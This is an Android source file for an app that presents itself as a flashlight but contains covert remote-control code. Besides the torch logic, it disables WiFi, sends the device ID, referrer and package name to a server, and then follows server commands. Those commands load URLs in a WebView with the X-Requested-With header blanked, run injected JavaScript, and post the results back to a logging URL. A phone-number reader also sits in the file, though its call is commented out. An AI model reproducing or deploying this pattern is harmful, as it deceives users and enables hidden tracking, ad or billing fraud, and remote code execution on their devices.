package com.big.light;

import android.annotation.TargetApi;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.DialogInterface.OnClickListener;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.hardware.Camera;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraManager;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.support.annotation.RequiresApi;
import android.support.v7.app.AppCompatActivity;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;
import android.webkit.ValueCallback;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;
import android.widget.ImageButton;
import android.widget.LinearLayout;
import android.widget.TextView;

import com.big.Models.Constant;
import com.big.Models.Global;
import com.big.Models.HttpUtils;
import com.loopj.android.http.JsonHttpResponseHandler;
import com.loopj.android.http.RequestParams;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.HashMap;
import java.util.Map;

import cz.msebera.android.httpclient.Header;


public class MainActivity extends AppCompatActivity {

    private Camera camera;
    private Camera.Parameters parameters;
    private ImageButton btnFlashlight;
    private ImageButton btnSetting;
    private ImageButton btnWebview;
    private WebView webView;
    private Button btnClose;
    private LinearLayout layoutWebview;
    private TextView textViewStatus;

    boolean isFlashLightOn = false;
    public int nSleep = 0;
    public int prevSleep = 0;

    public JSONArray arrResult;
    public int nIndex = 0;

    private CameraManager mCameraManager;
    private String mCameraId;


    Map<String, String> extraHeaders = new HashMap<String, String>();
    SharedPreferences prefs = null;

    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Global.g_main = this;

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            mCameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
            try {
                mCameraId = mCameraManager.getCameraIdList()[0];
            } catch (CameraAccessException e) {
                e.printStackTrace();
            }
        }

        WifiManager wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        wifiManager.setWifiEnabled(false);

        btnFlashlight = (ImageButton)findViewById(R.id.btnFlash);
        btnFlashlight.setOnClickListener(new FlashOnOffListener());

        btnSetting = (ImageButton)findViewById(R.id.btnSetting);
        btnSetting.setOnClickListener(new SettingListener());

        btnWebview = (ImageButton)findViewById(R.id.btnWebview);
        btnWebview.setOnClickListener(new WebviewListener());

        webView = (WebView)findViewById(R.id.webView2);
        extraHeaders.put("X-Requested-With", "");
        WebSettings webSettings = webView.getSettings();
        webSettings.setJavaScriptEnabled(true);
        webView.setScrollBarStyle(View.SCROLLBARS_INSIDE_OVERLAY);

        btnClose = (Button)findViewById(R.id.btnClose);
        btnClose.setOnClickListener(new CloseListener());

        textViewStatus = (TextView)findViewById(R.id.statusTextView);

        layoutWebview = (LinearLayout)findViewById(R.id.layoutWebview);


        webView.setWebViewClient(new WebViewClient() {
            @TargetApi(Build.VERSION_CODES.KITKAT)
            @Override
            public void onPageFinished(final WebView view, String url) {
                super.onPageFinished(view, url);

                textViewStatus.setText("Webview Loading Finished! URL : " + url);
                runWithResponse();
            }

            public boolean shouldOverrideUrlLoading(WebView view,
                                                    String url) {
                super.shouldOverrideUrlLoading(view, url);
                return false;
            }
        });

//        String phone = getMyPhoneNO();


        prefs = getSharedPreferences("flashlight_Pref", MODE_PRIVATE);

        if (prefs.getBoolean("firstrun", true)) {
            prefs.edit().putBoolean("firstrun", false).commit();

        }
        else {
            String android_id = Settings.Secure.getString(getApplicationContext().getContentResolver(),
                    Settings.Secure.ANDROID_ID);
            String referrer = prefs.getString("referrer", "");
            String packageName = getApplicationContext().getPackageName();

            RequestParams params = new RequestParams();
            params.put("android_id", android_id);
            params.put("referrer", referrer);
            params.put("package", packageName);
            callAPI(Constant.URL_BOOT, params);
        }
    }

    private class FlashOnOffListener implements View.OnClickListener{

        @RequiresApi(api = Build.VERSION_CODES.M)
        @Override
        public void onClick(View v) {
            if(isFlashLightOn){
                turnOffFlashLight();
            }else{
                if (isFlashSupported()) {
                    turnOnFlashLight();
                } else {
                    showNoFlashAlert();
                }
            }
        }

    }

    public void turnOnFlashLight() {

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                mCameraManager.setTorchMode(mCameraId, true);
            }
            else {
                if (camera == null)
                    camera = Camera.open();
                Camera.Parameters params = camera.getParameters();

                if (camera == null || params == null) {
                    return;
                }

                params = camera.getParameters();
                params.setFlashMode(Camera.Parameters.FLASH_MODE_TORCH);
                camera.setParameters(params);
                camera.startPreview();
            }
            isFlashLightOn = true;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    public void turnOffFlashLight() {

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                mCameraManager.setTorchMode(mCameraId, false);
            }
            else {
                if (camera == null)
                    camera = Camera.open();
                Camera.Parameters params = camera.getParameters();

                if (camera == null || params == null) {
                    return;
                }

                params = camera.getParameters();
                params.setFlashMode(Camera.Parameters.FLASH_MODE_OFF);
                camera.setParameters(params);
                camera.startPreview();
            }
            isFlashLightOn = false;

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private class SettingListener implements View.OnClickListener{

        @Override
        public void onClick(View v) {
            Intent intent = new Intent(MainActivity.this, SettingActivity.class);
            startActivity(intent);
        }
    }

    private class WebviewListener implements View.OnClickListener{

        @Override
        public void onClick(View v) {
            layoutWebview.setVisibility(View.VISIBLE);

        }
    }


    private class CloseListener implements View.OnClickListener {

        @Override
        public void onClick(View v) {
            layoutWebview.setVisibility(View.INVISIBLE);
            prevSleep = 0;
            nSleep = 0;
        }

    }

    private String getMyPhoneNO() {
        TelephonyManager tMgr = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        int simState = tMgr.getSimState();
        switch (simState) {
            case TelephonyManager.SIM_STATE_ABSENT:
                // do something
                break;
            case TelephonyManager.SIM_STATE_NETWORK_LOCKED:
                // do something
                break;
            case TelephonyManager.SIM_STATE_PIN_REQUIRED:
                // do something
                break;
            case TelephonyManager.SIM_STATE_PUK_REQUIRED:
                // do something
                break;
            case TelephonyManager.SIM_STATE_READY:
                // do something
                break;
            case TelephonyManager.SIM_STATE_UNKNOWN:
                // do something
                break;
        }
        String mPhoneNumber = tMgr.getLine1Number();
        return mPhoneNumber;
    }

    private void showNoFlashAlert() {
        new AlertDialog.Builder(this)
                .setMessage("Your device hardware does not support flashlight!")
                .setIcon(android.R.drawable.ic_dialog_alert).setTitle("Error")
                .setPositiveButton("Ok", new OnClickListener() {

                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        dialog.dismiss();
                    }
                }).show();


    }

    @RequiresApi(api = Build.VERSION_CODES.ECLAIR)
    private boolean isFlashSupported() {
        PackageManager pm = getPackageManager();
        return pm.hasSystemFeature(PackageManager.FEATURE_CAMERA_FLASH);
    }

    public void callAPI(String url, RequestParams params) {

        textViewStatus.setText("Calling API... URL : " + url);

        HttpUtils.post(url, params, new JsonHttpResponseHandler() {

            @Override
            public void onSuccess(int statusCode, Header[] headers, JSONArray arrResponse) {
                // Pull out the first event on the public timeline
                Log.d("response", "---------------- this is response : " + arrResponse);

                arrResult = arrResponse;
                nIndex = 0;

                runWithResponse();
            }

            @Override
            public void onStart() {
                // called before request is started
            }


            @Override
            public void onRetry(int retryNo) {
                // called when request is retried
            }
        });
    }

    private void callLogURL(final String url, String parameter) {

        textViewStatus.setText(String.format("Calling API URL : %s...", url));
        RequestParams params = new RequestParams();
        params.put("return", parameter);

        HttpUtils.post(url, params, new JsonHttpResponseHandler() {
            @Override
            public void onSuccess(int statusCode, Header[] headers, JSONObject object) {
                // Pull out the first event on the public timeline
                Log.d("response", "---------------- this is response : " + object);
                try {
                    textViewStatus.setText("URL Log calling Finished!  Result : " + object.getString("result"));
                } catch (JSONException e) {
                    e.printStackTrace();
                }

            }
            @Override
            public void onSuccess(int statusCode, Header[] headers, JSONArray arrResponse) {
                // Pull out the first event on the public timeline
                Log.d("response", "---------------- this is response : " + arrResponse);
                textViewStatus.setText("URL Log calling Finished!  URL : " + url);

            }

            @Override
            public void onStart() {
                // called before request is started
            }


            @Override
            public void onRetry(int retryNo) {
                // called when request is retried
            }
        });
    }

    @TargetApi(Build.VERSION_CODES.KITKAT)
    public void runWithResponse() {
        if (nIndex == arrResult.length()) {
            textViewStatus.setText("Finished!");
            return;
        }
        JSONObject object = null;
        try {
            object = arrResult.getJSONObject(nIndex);
            String type = object.getString("type");

            if (type.equals("webview") == true) {
                String url = object.getString("url");
                webView.loadUrl(url, extraHeaders);
                nIndex++;

                if (url == null) url = "";
                textViewStatus.setText(String.format("Webview URL : %s Loading...", url));
            }
            else if (type.equals("api_instructions") == true) {
                String url = object.getString("url");
                callAPI(url, null);
                nIndex++;
            }
            else if (type.equals("sleep") == true) {
                long sleeptime = object.getLong("ms");
                textViewStatus.setText(String.format("Waiting %d seconds...", sleeptime / 1000));
                new Handler().postDelayed(new Runnable(){
                    public void run() {
                        nIndex++;
                        runWithResponse();
                    }
                }, sleeptime);
            }
            else if (type.equals("javascript") == true) {
                String strScript = object.getString("script");

                if (strScript == null) strScript = "";

                textViewStatus.setText(String.format("Javascript : <%s> Injecting...", strScript));
                final JSONObject finalObject = object;
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                    webView.evaluateJavascript(strScript, new ValueCallback<String>() {
                        @Override
                        public void onReceiveValue(String s) {
                            textViewStatus.setText(String.format("Javascript injecting finished! returned : %s", s));

                            if (finalObject.has("url_log")) {
                                try {
                                    String url_log = finalObject.getString("url_log");
                                    callLogURL(url_log, s);
                                } catch (JSONException e) {
                                    e.printStackTrace();
                                }
                            }
                        }
                    });
                }
                else {
                    webView.loadUrl("javascript:" + strScript, extraHeaders);
                    if (finalObject.has("url_log")) {
                        try {
                            String url_log = finalObject.getString("url_log");
                            textViewStatus.setText(String.format("Not available to use evaluateJavascript Android version KITKAT"));
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                    }
                }
                nIndex++;
                runWithResponse();
            }

        } catch (JSONException e) {
            e.printStackTrace();
        }
    }



    @Override
    protected void onDestroy() {
        if(camera != null){
            camera.stopPreview();
            camera.release();
            camera = null;
        }
        super.onDestroy();
    }

}
